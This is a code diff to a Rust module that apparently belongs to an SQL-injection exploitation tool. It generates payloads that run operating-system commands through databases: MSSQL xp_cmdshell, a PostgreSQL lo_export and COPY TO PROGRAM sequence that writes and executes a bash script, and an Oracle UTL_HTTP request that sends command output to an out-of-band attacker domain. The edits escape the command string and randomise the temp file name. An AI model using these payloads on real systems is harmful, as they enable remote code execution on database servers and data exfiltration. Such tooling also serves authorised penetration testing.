@@ -47,8 +47,9 @@ impl OsCommandPayloads {
     pub fn all_payloads(cmd: &str) -> Vec<OsExecPayload> {
         // Escape the command to prevent SQL injection
         let cmd_escaped = Self::escape_sql_string(cmd);
-        // Generate random temp file for PostgreSQL payloads to avoid TOCTOU
+        // Generate random temp files for PostgreSQL payloads to avoid TOCTOU
         let pg_temp_file = Self::random_temp_file();
+        let pg_temp_sh = format!("{}.sh", Self::random_temp_file());
         vec![
             // ── MSSQL ──────────────────────────────────────────────────────────────
             OsExecPayload {
@@ -121,7 +122,7 @@ impl OsCommandPayloads {
             OsExecPayload {
                 payload: format!(
                     "'; EXEC sp_executesql N'EXEC master..xp_cmdshell N\\'{}\\''-- ",
-                    cmd
+                    cmd_escaped
                 ),
                 description: "MSSQL sp_executesql wrapping xp_cmdshell",
                 dbms: "MSSQL",
@@ -170,11 +171,11 @@ impl OsCommandPayloads {
             },
             OsExecPayload {
                 payload: format!(
-                    "'; SELECT lo_export(lo_from_bytea(0,'{}'::bytea),'/tmp/_sqx.sh'); \
-                     COPY (SELECT '') TO PROGRAM 'bash /tmp/_sqx.sh'-- ",
-                    cmd_escaped
+                    "'; SELECT lo_export(lo_from_bytea(0,'{}'::bytea),'{}'); \
+                     COPY (SELECT '') TO PROGRAM 'bash {}'-- ",
+                    cmd_escaped, pg_temp_sh, pg_temp_sh
                 ),
-                description: "PostgreSQL lo_export + COPY TO PROGRAM",
+                description: "PostgreSQL lo_export + COPY TO PROGRAM (random temp file)",
                 dbms: "PostgreSQL",
                 required_privilege: "SUPERUSER",
                 returns_output: false,
@@ -257,7 +258,7 @@ impl OsCommandPayloads {
                 payload: format!(
                     "'; DECLARE r VARCHAR2(1000); \
                      BEGIN r:=UTL_HTTP.REQUEST('http://{{OOB_DOMAIN}}/'||{}); END;-- ",
-                    cmd
+                    cmd_escaped
                 ),
                 description: "Oracle UTL_HTTP OOB exfil (requires --oob-domain)",
                 dbms: "Oracle",
